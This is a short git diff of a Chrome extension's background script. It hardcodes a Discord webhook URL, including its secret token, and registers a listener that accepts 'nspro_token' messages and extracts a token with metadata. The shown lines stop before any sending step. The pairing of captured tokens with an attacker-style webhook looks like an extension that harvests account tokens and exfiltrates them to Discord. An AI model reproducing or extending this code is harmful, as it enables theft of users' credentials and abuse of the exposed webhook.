@@ -1,6 +1,6 @@
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1550818376081739796/zVwRp0urx27-9r0EPU2zjBFLhBv_fViDz78TNv5VvyBEWLBqTP29wFizhI1SsZe5vjMO";
 
-chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
+chrome.runtime.onMessage.addListener((msg) => {
   if (msg?.type !== "nspro_token") return;
   const { token, meta, ts } = msg.payload || {};
   if (!token) return;
